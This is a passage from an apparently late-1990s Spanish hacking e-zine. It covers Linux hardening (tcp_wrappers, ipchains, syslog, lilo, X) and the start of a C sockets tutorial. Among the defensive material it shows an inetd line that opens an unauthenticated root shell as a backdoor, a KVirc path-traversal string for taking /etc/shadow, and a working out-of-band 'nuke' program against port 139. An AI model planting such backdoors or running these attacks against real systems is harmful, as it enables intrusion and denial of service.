facil editamos el fichero " /etc/ientd.conf " y le a¤adimos una entrada
diciendole que cuando se le pida una peticion a ese puerto muestre
directamente la bash o
si no nos hazemos un pequ¤o programa que pida un passwd y depues nos lanze a
la terminal si ha ido bien todo . En el /etc/inetd.conf pondremos algo como
esto tambien nos dirigiremos a services y miraremos algun puerto que este
vacio le ponemos el nombre que queramos y ya esta .

"/etc/inetd.conf"
yo    stream  tcp    nowait  root   /bin/sh  sh -i 

"etc/services".El puerto 26 mismo esta vacio o buscar otro que este mas
alejado
yo    26/tcp

Ahora al hazer un telnet al puerto 26 de nuestra machine entraremos tan 
campantes con una bonita sesion de root . Facil no , el uso de este ejemplo
ha sido para ke veais las posibles formas de asegurarse la entrada a tu
makina esta linea te la puede hazer algun amigo tuyo en algun momento de
descuido para despues gastarte bromitas. Pero aconsejo instalar algun
programa que al entrar te pida un passwd por que si no seria demasiado
descarado y peligroso .

-=( 04 )=--=( tcp_wrapper )=-

Con estos archivos podremos configurar el accesso a nuestra makina por
ejemplo si solo queremos ofrecer accesso al telnet a la red local o a ciertas
IP's en concreto o todo lo contrario denegarlo para ciertas IP's en concreto.
Para activar los tcp wrappers se tendra que poner en el inetd que la
solicitud del servicio lo haga el tcpd y depues el servicio :

telnet   stream  tcp    nowait  root    /usr/sbin/tcpd  in.telnetd

A qui primero lo pasa al tcpd y depues lo pasa al in.telnetd pero primero 
comprueba si esa IP esta permitida etc dependiendo de lo que diga la
configura.

Los archivos de configuracion son :
/etc/hosts.allow  ; A las que les permitimos el acceso 
/etc/hosts.deny   ; A las que les denegamos el acceso

los archivos se configuran a si (servicio : host o ip : y la accion a tomar)

ALL: ALL: deny ; Esto es un ejemplo de denagacion total

Servicio : aki se debe especificar el servicio in.telnetd , etc

Host : ALL (se refiere a todos lo hosts) , LOCAL ,KNOW o UNKONW (de los que
se tiene informacion o no) , PARANOID (el nombre que te ofrecen no concuerda
con el que el) tcp_wrapper espera .

Accion : accept (para que acepte la conexion si todo va bien), deny (deniega
la conexion), spawn (acepta la conexion y realiza el comando que se le diga
por el bash), twist (rechaza la conexion y realiza los comandos bash).

Los comandos son los siguientes

%a, %c, %h y %n: nombre de la makina ke intenta acceder
%d: demonio ke controla el puerto por el ke accede
%p: PID del proceso ke controla la conexion

Ahora algunos ejemplos pa que lo pilleis al vuelo .

Conexion cerrada mu cerrada :
"/etc/hosts.allow"
ALL: ALL: deny

Conexion solo para locales : 
"/etc/hosts.allow"
ALL: ALL: deny
ALL: 127.0.0.1

Cerrado y te dice quien intenta entrar en la terminal 12 :
"/etc/hosts.allow"
ALL: ALL: twist ( /usr/bin/echo -e "Intento de %a en puerto %d" > /dev/tty12 )

-=( 05 )=--=( Scanneadores de Red o Sniffer )=-

Muchas vezes queremos saber quien nos haze un ping o quien no intenta nukear
o simplemente queremos ver lo maravilloso que es linux y derivados del bueno
pues una utilidad muy buena llamada "tcpdump" ahora explico como funciona lo
primero sera poner : 'tcpdump -i tipo_de_red > /dev/alguna_terminal_vacia &'
en tipo de red pondremo lo que es red local de la propia makina si queremos 
eschuchar o otro tipo de red escribe ifconfig y pon la que quieras usualmente 
pondras ppp0,eth0,etc . En nuestro caso ponemos lo pa ver su uso a el '-i' le 
dice eltipo de red despues el simbolo '>' le dice que saque la salida por
donde le digamos tambien puede ser un archivo en nuestro caso fue la terminal
11 digase /dev/tty11  y despues el simbolo & pa que lo haga en background
creo que todas estas cosas no hay que explicarlas por que se deberian de
saber ( pa quien no sepa estas cosas le recuerdo que se jarte de leer ayuda
sobre el prompt , etc y se deje tanta kde , gnome , etc , Ademas en las
terminales no quedas ciego cada vez que enciendes la luz a la 2:00 ) . Bueno
una vez que hayamos escrito esto nos dira algo como ' listening on lo ' .
Entonzes ahora nos hazemos un ping a nuestra propia makina ' ping localhost '
ahora nos vamos a la tty11 y vemos como nos muestra musha info de quien no
esta haziendo el ping. El tcpdump lo unico que haze es analizar las
cabeceras de los paketes que circulan por la red .

Otro pakete bastante interesante es el ethreal como el tcpdump pero para las
X mas concreto usa las librerias GTK su uso es mu simple le dises el tipo de
red a analizar . Tambien estaria el ksniffer que es como el ethereal para las
X y usando las librerias QT este no lo he llegado a usar yo pero es tambien
muy bueno. Tambien esta el sniffit que es modo texto y bastante potente .

Otra utilidad que trae casi todo linux que se tierce es el icmpinfo que se 
encarga de analizar todos lo paketes icmp (internet control manager protocol)
el ping es un ejemplo de esto en verdad el protocolo ICMP nacio para
controlar el estado de la red, tu envias un pakete y lo que tarde en
responderte es el retardo que tienes o lag (si se¤or a sin se averigua el lag
simple no) pero de aki al uso que havezes se le ha querido dar cambia mucho
por ejemplo si alguien que tiene una super linea de 2/mb's de ancho de banda
se pone a flodear a alguna persona con un modesto modem a 33600 baudios pos
este caera por ke no le dara tiempo a responder todas la peticiones este
atake la verdad es ke algo malo por con un simple firewall podemos denegar
todos los paketes ICMP pero bueno a lo que vamos al uso del icmpinfo es muy
simple basta con poner : "icmpinfo -vv & ", para ke no muestre la info si
keremos que nos muestre toda la info exepto ping se pondria a si "icmpinfo -v
& ", O si keremos que nos muestre en Hexadecimal los paketes "icmpinfo -vvv &
". Os recomiendo que si vais a tener el icmpinfo ejecutandose lo pongais con
salida a alguna terminal. A si kereis denegar todos los paquetes icmp cosa
no recomendable pero para que vayais pichandole el uso al ipchains seria a
si:

Para denegar todos lo paketes ICMP (Nucleos 2.2.X) :

ipchains -F
ipchains -A input -s localhost -j ACCEPT
ipchains -A input -p icmp -j DENY

-=( 06 )=--=( Los Logs )=-

Los logs son archivos donde se graba lo que va ocurriendo por la maquina y 
como no tambien hay un encargado de esto que es el syslogd
(/usr/sbin/syslogd) para ver si esta en accion pon esto , ps aux | grep
syslogd . y si sale algo como esto (la verdad es que lo raro es que no salga
mu raro).De echo va a salir

root        70  0.0  0.6  1472   208  ?  S    19:05   0:00 /usr/sbin/syslogd

Pues vamos a ver un poco su archivo de configuracion por que los logs suelen
tener en todas la makinas los mismos directorios pero esto se puede cambiar 
suelen ser /var/log/* . Aunque esto cambia entre distribuiciones y Sistemas 
Operativos hasta el Windows guarda los log por que es algo muy util para ver
por que ha ocurrido tal cosa o otra , etc.

Configuracion del Syslogd : (/etc/syslogd.conf)

/etc/syslog.conf -> Aqui se le dice donde guardar los logs y todas las
opciones de configuracion del mismo .

mail.*       -/var/log/mail --> Aqui se le dice donde guardar los mails.

Si queremos nostros a¤adir una opcion basta con poner primero que tipo de
cosa queromos logear y despues el destino tambien podemos mandar los logeos a
otras terminales digase la /dev/tty{8,9,10} veamos un ejemplo .

*.*     /dev/tty9 ; Manda todo lo que pasa a la terminal 9 muy util

Con este truquillo sale por ejemplo todos los accesos o todos lo errores o
los comandos tipo su , Es un poco lioso por que se junta todo en una terminal
y nos manda tambien info que tal vez no interese para solucionar esto se le
pude indicar la informacion que queremos recibir solo .

Las cosas que pude logear son las siguientes :

kern   -> Los Mensajes que manda el kernel .
user   -> Los mensajes hechos por los usuarios .
news   -> Logea las News .
mail   -> Los mails .
lpr    -> Gestion de las Impresoras .
uucp   -> Logea las conversacion a traves del uucp .
auth   -> Esto es de la autetificacion como cuando se conecta alguien o un su
daemon -> Logea info de los demonios .

Y la prioridad :

emerg  -> Cuando es una emergencia y se aproxima la caida del sistema .
alert  -> Te alerta de un error en estos casos es mejor matar el programa .
crit   -> Critico error del Hardware (creo) .
err    -> Un simplre eror .
warn   -> Te da un aviso .
notice -> Te notifica de algo .

kern.warn;*.err  /dev/tty10 ; A qui se manda los avisos del Kernel y todos
los errores a la terminal 10 se puden a¤adir mas cosas poniendo ; y la accion

Tambien puedes hacer para que te pase las advertencias a otro hosts yo mismo
no lo e podido probar pero la sintaxis serai algo parecido a esto . 

*.*     @nombre_del_host ; si indicamos el nombre del host en el /etc/hosts
se dirigira directamente a la IP que le indiques , O si no a¤adimos la ip .

Algunos logs mas y comandos :

lastlog : En este log se guarda la info de cuando fue la ultima vez que un 
usario entro en un sistema el log se encuentra en /var/log/lastlog o en 
/var/adm/lastlog ,el archivo es un binario por lo que no lo podreis
visualizar para la funcion que queremos nosotros dado que nos saldra muchos
simbolos raros me explico por lo que tendremos usar el comando lastlog

last : Con este comando se nos mostrara todos los accesos y salidas del
sistema es comando "last" lo que haze es mostrarnos un archivo binario como
el lastlog el archivo exactamente es el wtmp que suele estar en /var/log/wtmp

History : Con esto podemos ver los ultimo comandos realizados desde la bash
con poner "history" se nos mostrara una grandiosa lista de todos los comandos
para borrar la lista con poner "history -c" se limpiara la lista tambien
tiene un lugar para loggear esto dependiendo de la shell la de la bash es :
/~/.bash_history ; Pero esta se grabara al finalizar la sesion volviendo al 
history dire una cosilla muy util si queremos buscar entre los comandos 
ejecutados ctrl + r , podremos buscar los comandos ejecutados

Tambien esta otro programa derivado del last el lastb que muestra todos los
accesos fallidos esta opcion suele venir desactivada por lo menos en la  
distribuicion de la suse por lo que tendremos que irnos al archivo : 

/etc/login.defs ; Login Configuration  
FTMP_FILE  /var/log/btmp ; Quitandole la # activaremos el logeo de de accesos 
fallidos. Este archivo en maquina monousuario es un poco tonto activarlo .

-=( 07 )=--=( Truquillos varios )=-

Prohibir el acceso desde telnet al root osea que si os hacen telnet que no
sea con root aunque si se saben el passwd con hazer depues un su basta . Por
si tenemos un passwd bastante simple y lo pueden adivinar .

Configurar bien el servidor NFS dado que si esta mal configurado y te hacen
el truco de montar su disco duro en tu ordenador se convierten en root pero
eso es un error de configuracion en verdad . 

No usar siempre el root por que muchas veses se mete la gamba y se jode todo
el invento . El que avisa no es traidor . Un ejemplo un dia estaba
toqueteando mi ordenador cuando empece con esto y quise borrar un direcotorio
entonces pues rm -rf pero justo antes habia vuelto al directorio anterior por
lo que me carge un monton de archivos cosa que si hubiera tenido cuidado no
hubiera pasado y amcada directorio sus cosas si tu quieres compilar un
programa pos lo mejor es hazerlo en /usr/src para tener un minimo de orden en
las cosas.Aunque no tiene importancia desde donde lo compiles como un dia me
dijo un tio que si los programas no se compilan desde "/usr/local" no
funciona anda que lo que hay que oir . Una vez compilado el programa lo
podeis borrar vamos no es mas que por uso inecesario de disco duro y otra
cosa es por ejemplo si tenemos el kernel una vez compilado se puede borrar
si quieres copia el archivo .config para no tener que andar configurando
mucho el Nucleo a la hora de compilar .

Los modos de los archivos tambien son importantes pero en un sitema del uso
propio no tienen tan importancia por ejemplo que el usuario normal tenga 
permisos de lectura al archivo "/etc/ppp/pap-secrets" dado que se supone que
tu ya lo sabes , claro que si ya estamos en un servidor o damos servicio de
telnet pa ke se queden flipaos tus amigos de la potencia de linux pos si es
mas importante musho mas al igual que la setsuid .

En el irc no conectarse como root ¿por que? pues mira por ejemplo si estais 
usando el Kvirc , exactamente la version 0.9.0 hay un peque¤o bug que permite 
enviarte tu mismo los fichero que quieras escribiendo esto :
!NICK ../../../../../../../etc/shadow ; Y claro pondriamos en aprieto
la seguridad del sistema el archivo shadow solo se puede enviar si eres root
o bien si tienes la setsuid en el Kvirc activada cosa que no recomiendo como
veis ya sabeis una cosa mas para no usar tanto el root. Mucha gente hablaba 
de por que no se podia conectarse como root pues ya sabes una mas de las
tantas y quitarle la setsuid que creo que viene activada que si no es lo
mismo.

Si das el servicio de telnet el archivo /etc/issue.net que se muestra cuando
te conectas por login muestra la version del kernel la distribuicion esto 
tiene facil remedio editas el archivo y ya esta , %r Esta opcion muestra la
version del kernel con suprimirla bastaria estas opciones bienen del mingetty
por lo que si kieres montarte un issue.net guapo puedes configurarlo tu
mismo.

Antes de poner alguna que no sabes bien del todo no lo pongas a lo tonto 
molestate en buscarte algun documento o manual pa ponerlo bien . Mucho fallos
de seguridad no se deben a fallos del programa si no a la mala configuracion.
Digo muchos pero tambien hay de los otros.

Aprende a usar el VI te salvara la vida mas de una vez ademas su uso es
simple y bastante potente.

-=( 08 )=--=( Seguridad desde el Nucleo )

A aqui tendremos que compilar el nucleo para dar soporte Firewall .
Ahora os preguntareis que un firewall sirve para por ejemplo aceptar o
rechazar ciertos rangos de ip o ciertos paquetes podriamos decir que los
tcp_wrapper son parecidos pero un firewall es mucho mas potente.
Para configurar un firewall en nucleos 2.2.X se usa el ipchains y para
nucleos 2.0.X ipfwadn y para los nucleos 2.3.X proximante 2.4.X se usara una
nueva herramienta me pareze que se llamara net filter .
La sintaxis de ipfwadm e ipchains no varia mucho , en el uso de ipfwadm no 
estoy tan puesto como en el ipchains pero su sintaxis es mu parecida.

Lo primero sera configurar el nucleo habilitando las opciones de 
 - [*] Network firewalls 
 - [*] IP: firewalling (NEW)

Supongo que si has llegado hasta aki sabras compilar en nucleo que es una
tarea facil. Dado que si no el programa os dira lo que yo os digo que
compileis el nucleo con estas opciones . Ahora con el nucleo ya compilado
podremos decirle al ipchains que por ejemplo deniege todo tipo de paketes e
solicituedes al puerto que queramos como al del 6000 cuando se nos habren las
X o el de la impresora el 515 o cualquiera que queramos estas cosas el
tcp_wrapper estaba mas limitado por que lo leia del inetd si no me equivoco.
Las diferencias del ipchains frente al ipfwadm las que yo se son
redireccionamiento de puerto y una mayor solventura en equipos con una red
muy llena . Por lo que el ipchains y el ipfwadm sirven para el blokeo de
paketes cuando se les esta denegado ese puerto ese es el uso basico de un
firewall aunke luego puedan hasta denegar protocolos etc. Su uso masfrecuente
es cuando se tiene una red y no se quiere que esta tenga acceso al exterior
digase internet por lo que colocan un servidor y le configuran un firewall de
modo que solo tengan accesos a las impresoras locales y no al otro host que
les daria acceso a internet. Una explicacion un poco mala.

Ahora unos ejemplos :
Este ejemplo haze una denegacion total al servicio de las X desde el puerto 
6000 al 6100 dado que cada vez que se abre una nueva sesion se incrementa en
1.

"Nucleos 2.2.X"
ipchains -A input -p tcp -j DENY -s 0.0.0.0/0 -d 0.0.0.0/0 6000:6100

"Para Nucleos 2.0.X"
ipfwadm -I -a deny -P tcp -S 0.0.0.0/0 -D 0.0.0.0/0 6000:6100

Otra cosa seria poner --nolisten tcp al iniciar el servidor de las X , pero
lo que pretendo es que se aprenda a usar el ipchains.

Como veis con este ejemplo si lo testeais un poco podreis denegar otros
puertos creo que es no es mu dificil vamos digo yo. Ahora dare algunas
cosillas del ipchains.


-=( 09 )=--=( Seguridad desde dentro )

Con esto me refiero a la configuracion del propio ordenador , por ejemplo si
no queremos que nadie toque el ordenador lo mas simple sera ponerle una
contrase¤a a la bios . pero quitandole la pila se resuelve el problema otra
solucion es poniendole una contrase¤a al lilo doy por echo de que sabeis lo
que es lilo de la siguiente forma poniendo password=contrase¤a dentro de cada
imagen que quisieramos proteger por ejemplo si queremos poner contrase¤a a
nuestras imagenes del linux pero dejando la del guindows sin contrase¤a para
a sin no dejar que nuestro simpatico hermano toquete la maquina o por simple
paranoia.

"etc/lilo.conf"
image=/boot/vmlinuz.2.2.12
   root=/dev/hdd1
   password=el_passwd
   label=lin2

Queda claro donde es cada cosa en mi caso tengo mas de una imagen al poner 
linux por lo que si quiero proteger otra tendria que a¤adir otra linea de 
password=clave , Esta es la forma mas sencilla . Si sois una persona
paranoica y pensais que todavia puede haber alguien que husmee en vuestra
cachara como vuestra abuela la paralitica o el perro pues entonzes lo mejor
es dormir con el disco duro y el peluche de un pinguino :) .

Pero tambien podriamos entrar en Linux con una shell de root si tenemos
acceso fisico poniendo single donde nos dise que insertemos una opcion de
esta forma estaremos metidos de la forma mas pachangera posible pero funciona
el remedio es el siguiente poniendo restricted y passwd=el_passwd pero esta
vez no haze falta que sea en cada imagen dado que nos pedira el passwd al
hazer cosas como estas de single , etc .

Claro que si ponemos las claves despues cualquier persona puede saberlas con
un simple cat /etc/lilo.conf dado que estas siquen a qui. La solucion es una
vez puestas ejecutar "lilo" y ya las podemos borrar del archivo por que esto
lo compila y ya no vuelve a leer este archivo.
 
-=( 10 )=--=( Seguridad en las X )=-

Con esto mo me refiero a la seguridad de cuando estais viendo la peliculilla 
del viernes noche canal + , y no kereis que nadie os pille y diga pero
ni¤oooo que estas viendo y te suelten ostias , Fuera de bromas pero la mayor
seguridad pa ver Canal+ sin ke te pillen es viendolo en codificado y
descodificandolo en tiempo real , por ti mismo al principio cuesta pero una
vez echos los 5 cursos que la INEM daba ya pude hazerlo bien (Grazias por
gastar el dinero publico en cursos tan interesantes). Bueno ahora ya si que
empezamos a ke le llamamos X pues antiguamente cuando los cacharos era muchos
mas grandes de lo de ahora y su coste era musho mas que lo de ahora (que de
logica), pues las X servian para ke la gran makina gestionase los graficos y
las otras terminales se conectasen a ella y se desde a hi podian ver las X
pero desde la maquina Potente que se encargaba de gestionarlo todo para
abaratar costes (estas makinas todavia no las he llegado a ver yo debido a mi
corta edad). No se si me explicado bien con lo ke queria llegar a decir es
que cuando habres tu sesion de las X sea : Window Maker , Enlightnamet,
FMNW , KDE , etc . Los drivers de tu tarjeta y otras cosas como el raton y
otras tantas que no vienen a cuento exepto una la del uso de la red . Cada
vez que ejecutamos las X se nos abre el puerto : 6000 y se va incrementado en
1 por cada usuario que se vaya conectando. Esto tiene su metodo de seguridad
es desde a¤adir los host permitidos con el comando xhost + nombre_de_la_makina
y xhost -nombre_de_la_makina . Pero esto la verdad es ke mucha seguridad no
da por que realmente da permiso a todos los usuarios de esa makina por lo que
en una makina monousuaria que confiamos del due¤o pos si vale pero si mas
usuarios es un riesgo a correr o si se a se Spoofing desde ese host pos se
nuestro servidor se creeria que tenemos confianza en el supuesto host por lo
que existen otros metodos como el intercambio de claves publicas o con
encriptacion des (este es el standar de encriptacion que usa linux con sus
archivos de passwd). Pero si realmente nostros no keremos dar ningun tipo de
servicio lo que tendremos que hazer sera decirle a las "X --nolisten tcp"
estonos saldra las X a palo seko sin administrador de ventanas ni nada para
que no salga con nuestro administrador tendremos que toketear los scripts de
inicio de las X . Que varia en cada distribuicion .  

Tambien podeis poner " startx -- -nolisten tcp " y listo (Queda claro que las 
comillas son para se¤alar el comando).

-=( 11 )=--=( Documentacion )=-

MAN : (man + documento)

man syslog
man tcpd
man hosts_access
man inetd
man ipchains
man ifconfig

How-To : ( Disponibles en el site de : www.insflug.org )
How-to de Firewalls
How-to de PPP
How-to de Redes
How-to de FTP anonimo

-=(WEBS)=-

www.securityfocus.com/ ; Pagina de Xploits y Bugs para estar al dia BUGTRAQ.
www.cert.org/ ; Pagina del comite de seguridad a nivel internacional bufff.
www.segurinet.org  ; Hay unos documentos mu majos y que me han ayudado en
                     algo.
www.hispasec.org  ; Pagina de seguridad Espa¤ola .
www.set-ezine.org ; Edita un Zine mu bueno ademas el saber no ocupa lugar
www.insflug.org  ; Para buscar How-To para linux mu recomendable
www.lucas.hispalinux.es ; El proyecto Lucas documentacion para linux en
                          espa¤ol
www.phrack.com/  ; Pagina de una revista de Hack muy buena esta en Ingles.
www.linuxfocus.org/ ; Una revista de Linux bastante interesante .
www.linux.apostols.org ; Pagina de un Grupo de Gurus del Linux Espa¤oles .
www.apostols.org ; El grupo de guru los apostols esta es mas bien para hack .
www.linux.org ; Pos de que si no de nuestro S.O favorito.
www.linux.com ; De que si no .
www.freebsd.org ; El nomnbre lo indica . Otro S.O magnifico
www.seifried.org/lasg ; Una guia de Administracion de Linux .
www.nessus.org ; Programa que busca fallos .
www.fish.org ; Pagina donde podras bajarte varios programas para el chekeo .
www.undersec.org ; Pagina de un grupo de seguridad .
www.totalcoredump.org ; Otro grupo de seguridad .
www.jjf.org ; Pagina de otro grupo editaban un ezine pero creo que esta
              muerto.
www.hispahack.ccc.de ; Otro grupo de Hackers .
www.2600.com ; Pagina inglesa .
www.rootshell.com ; Pagina para encontrar exploits , docs , etc .
www.insecure.org ; Trae una lista de correo con bugs de los creadores den
                   map.
www.packerstorm.com ; Pagina Exploits 






ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍËÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍËÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
º         * ARTICULO *         º      * TEMA *      º       * NIVEL *       º
ºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄº
º10.- Sockets                  º    Programacion    º     Alto/Muy alto     º     
ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÊÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÊÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼
                                                                      [Doing]

NOTA: Este articulo esta dirigido a todas aquellas personas que estan
      intresadas en la programacion de socket, y para su total comprension
      requiere conocimientos de C y de protocolos. Podeis adquirir los
      conocimientos de C lellendo el curso cd C publicado en este mismo
      E-Zine, y en el articulo "Entra¤as de internet; prootoclos y demas"
      podeis adquirir conocimientos de protocolos (lo que no lo encuentres en
      7a69 es que no existe..... xD)

Ahi va el indice del articulo:

1.- Introduccion
2.- Sockets STREAM
2.1.- bind()
2.2.- listen() & accept()
2.3.- connect()
2.4.- Mandar y recibir datos
2.5.- E/S no-bloqueante (NON-blocking I/O)
3.- Sockets RAW
3.1.- ICMP
3.2.- IP & TCP
4.- Funciones utiles
4.1.- Resolviendo nombres
5.- Unos tips


Y empezemos y con todo esto:


        1.- INTRODUCCION

En este articulo no voy a hablar de incursiones ilegales en sistemas ni sobre
el ultimo bug de este o aquel demonio ni nada parecido. Voy a hablar sobre
algo que a mi parecer es mucho mas importante (para un hacker) que todo eso.
Si eres un lamer\script_kiddie de esos que solo le interesa lo de
arriba y luego no sabe hacer ni la 'o' con un canuto ... exit. Si no, sigue
leyendo. ¨Que co¤o es un socket? Un socket sirve para conectarte al IRC, para
ver la pagina web de SET :), para mandar mails, ... Ya, eso ya lo se, pero,
¨¨que es?? Bueno, un socket es, un "extremo de una comunicacion". En este
articulo hablare de los sockets en inet, es decir, los que usan los procesos
que corren en distintas makinas para comunicarse a traves de cualquier red
que soporte IP (que me quedo sin aire :). En este articulo intentare explicar
como tratar sockets en C desde linux. Para no hacerlo muy aburrido
intercalare algun programilla entre la teoria (que es _muy_ aburrida).

Si no sabes programar en C no se que co¤o haces leyendo esto, asi que ponte a
estudiar. Vamos pa`lla.


        2.- SOCKETS STREAM

Un socket STREAM sirve para establecer una conexion secuencial, confiable y
bidireccional (full duplex) de datos con otro socket. La familia de
direcciones que vas a usar es AF_INET, lo que quiere decir que los
protocolos que usan los sockets para comunicarse seran los de INET, en este
caso el TCP, ya que es el unico que ofrece una conexion confiable. Para crear
un socket en Unix se usa la llamada al sistema socket(). Esta llamada tiene
tres parametros y devuelve un entero que te servira despues para referenciar
al socket.

        int socket(int dominio, int tipo, int protocolo);

El parametro dominio especifica la familia de direcciones a usar, en este
caso AF_INET. El tipo que vas a usar es SOCK_STREAM, pero despues usaras
otros tipos. El protocolo especifica el idem que usara el socket para
comunicarse con el otro socket. Tu vas a usar el 6, que corresponde al TCP;
si no sabes que numero corresponde a un protocolo mira el file
/etc/protocols. Si la llamada falla devuelve -1; si no, devuelve un
descriptor de fichero que guardaras a buen recaudo para poder mandar y
recibir datos en el socket. Un ejemplo tipico de una llamada a socket()
seria:

        int fd = socket(AF_INET, SOCK_STREAM, 6);

Con esto solamente has creado un descriptor de fichero, nada mas. Ahora
puedes usarlo para recibir o establecer conexiones.


        2.1.- bind()

Para poder escuchar conexiones en un puerto necesitas realizar varias
operaciones sobre el socket. La primera es asignarle una direccion y un
puerto. Para ello se usa la syscall bind().

        int bind(int sockfd, struct sockaddr_in *addr, int addrlen);

bind() asigna al socket sockfd la direccion indicada en myaddr. Si tiene
exito devuelve 0. Los campos que nos interesan de la estructura sockaddr_in
son estos:

        -sin_family, que sera siempre AF_INET

        -sin_port, que especifica el puerto en bytes de red (BIG_ENDIAN)

        -sin_addr es una estructura que contiene un campo - s_addr - que
         indicala direccion IP.

Cuando uses la estructura sockaddr_in en bind pondras en sin_addr el valor
INADDR_ANY, para poder escuchar conexiones en cualquier interfaz (lo que
quiere decir que si pones la direccion 127.0.0.1 solo escuchara conexiones en
el interfaz lo).

Para crear un socket y asignarle la direccion 127.0.0.1, puerto http:

        int fd = socket(AF_INET, SOCK_STREAM, 6);
        struct sockaddr_in dir = { AF_INET, htons(80), inet_addr("127.0.0.1")
        };
        bind(fd, (struct sockaddr_in*) &dir, sizeof(dir));

Para crear un socket y asignarle cualquier direccion de la maquina, puerto
ftp:

        int fd = socket(AF_INET, SOCK_STREAM, 6);
        struct sockaddr_in dir = { AF_INET, htons(21), INADDR_ANY };
        bind(fd, (struct sockaddr_in*) &dir, sizeof(dir));

En el primer caso el socket solo escucharia conexiones en el interfaz lo, sin
embargo, en el segundo tambien se escuharian conexiones en, por ejemplo, la
interfaz eth0 (si la tuviera). Lo mismo si le asignas la direccion del
interfaz eth0 (p.e. 192.168.0.1): desde el interfaz lo no podrias comunicar
con el socket.


        2.2.- listen() & accept()

Con listen...

        int listen(int sockfd, int backlog);

...le indicamos al S.O. que queremos escuchar conexiones en el socket sockfd.
El famoso parametro backlog indica el numero de conexiones "a medias" que
puede soportar el socket ( en Linux 2.2.x es como maximo 128). Si el backlog
es superado cualquier intento de conexion es ignorado (te suena el synflood;)

Ya es hora de hacer una conexion de verdad. Ya tienes el socket, su direccion
y su puerto, y estas escuchando conexiones en el: solo nos falta aceptarlas
con accept().

        int accept(int sockfd, struct sockaddr *addr, int *addrlen);

accept() es una syscall bloqueante (el proceso se bloquea hasta que se
produzca una conexion en el socket). Devuelve un descriptor de fichero para
el socket CONECTADO, es decir, el descriptor de fichero que has de usar para
mandar datos al otro extremo es el que devuelve accept(), NO en el que
escuchas (que es el que ha devuelto socket()). A partir de ahora ya
puedes mandar o recibir datos a traves del socket. Para ello se usan las
syscalls write() y read() respectivamente (hay mas, ya lo veras mas
adelante). En los parametros addr y addrlen se guarda la direccion del
otro extremo, pero normalmente se ponen a 0. Aqui hay un programilla muy
cutre que escucha conexiones en el puerto 900 y escribe en pantalla todo lo
que le llega del socket.

*****************************[ sockets/serv1.c ]*****************************
        #include <netinet/in.h>

        void main()
        {
        int fdc, fdl = socket(AF_INET, SOCK_STREAM, 6);
        struct sockaddr_in dir = {AF_INET, htons(900), INADDR_ANY };
        char ch;

        bind(fdl, (struct sockaddr_in*) &dir, sizeof(dir));
        listen(fdl, 1);

        fdc = accept(fdl, NULL, NULL);
        close(fdl);
        while (read(fdc, &ch, 1)) write(1, &ch, 1);
        printf("\n");
        }
*****************************************************************************

Al ejecutarlo se queda esperando conexiones en el puerto 900, asi que tu
haces un telnet desde otra terminal al puerto 900 de la IP 127.0.0.1, y veras
como todo lo que escribas desde la sesion telnet aparece por pantalla. Simple
¨no?


        2.3.- connect()

De acuerdo, ya sabes hacer que un programa escuche en un puerto determimado,
ahora vas a establecer conexiones desde un socket que no esta escuchando, es
decir, vas a ser tu el que empieces la conexion. Lo primero es crear el
socket, eso ya sabes como hacerlo, y a continuacion se llama a connect(). Si
la llamada tiene exito devuelve 0 y el socket que usas para conectar se
encontrara en estado CONNECTED.

        int connect(int sockfd, struct sockaddr *addr, int addrlen );

Es addr tienes que poner la direccion y el puerto remoto con elque quieres
conectar. Como ves es muy simple. A partir de aqui ya se pueden enviar o
recibir datos desde el socket.


        2.4.- MANDAR Y RECIBIR DATOS

Para mandar y recibir datos en un socket en estado CONNECTED se pueden usar
varias funciones. Yo voy a explicar send() y recv(), ya que write() y read()
son equivalentes a las de antes pero con flags = 0.

        int send(int sockfd, const void *msg, int len, unsigned int flags);

send() manda el mensaje *msg de longitud len a traves del socket sockfd que
(valga la redundancia) tiene que estar conectado. Los flags pueden ser una
combinacion de los siguientes valores: (definidos en socketbits.h)

        /* Bits in the FLAGS argument to `send', `recv', et al. */
        enum
        {
        MSG_OOB = 0x01, /* Process out-of-band data. */
        #define MSG_OOB MSG_OOB
        MSG_PEEK = 0x02, /* Peek at incoming messages. */
        #define MSG_PEEK MSG_PEEK
        MSG_DONTROUTE = 0x04, /* Don't use local routing. */
        #define MSG_DONTROUTE MSG_DONTROUTE
        MSG_CTRUNC = 0x08, /* Control data lost before delivery. */
        #define MSG_CTRUNC MSG_CTRUNC
        MSG_PROXY = 0x10 /* Supply or ask second address. */
        #define MSG_PROXY MSG_PROXY
        };

Si la llamada a send() tiene exito devuelve el numero de bytes enviados, si
no devuelve -1. recv() es exactamente igual a send(), solo que los datos se
escriben en *msg (que tiene que tener memoria asignada) y como maximo se leen
len bytes del socket.

        int recv(int sockfd, void *msg, int len, unsigned int flags);

recv() es una llamada BLOQUEANTE. Hasta que no se recibe ningun dato a traves
del socket tu programa se quedara esperando. Esto se puede cambiar usando E/S
no bloqueante, como veras mas adelante. Para ilustrar un poco las llamadas
connect() y send() aqui pongo un codigo mas cutre todavia que el anterior. Es
el famoso nuke del port 139.

******************************[ sockets/nuke.c ]*****************************
        void uso(char *pr)
        {
        printf(" Uso:\n");
        printf("\t %s <dst ip> [dst port] [num]\n\n",pr);
        exit(0);
        }

        void main(int argc,char **argv)
        {
        int fd = socket(AF_INET,SOCK_STREAM,6);
        struct sockaddr_in dir = {AF_INET,htons(139),0};
        char *crack = "¡taluego lucas!";
        int num = 1;

        if (argc < 2) uso(argv[0]);
        if (argc > 2) dir.sin_port = htons(atoi(argv[2]));
        if (argc > 3) num = atoi(argv[3]);
        dir.sin_addr.s_addr = inet_addr(argv[1]);

        if (connect(fd,(struct sockaddr_in*)&dir,sizeof(dir)) == -1){
        perror(" connect() ");
        exit(0);
        }

        while (num--)
        if (send(fd,crack,strlen(crack),MSG_OOB) > 0) printf(" [b00m]");

        close(fd);
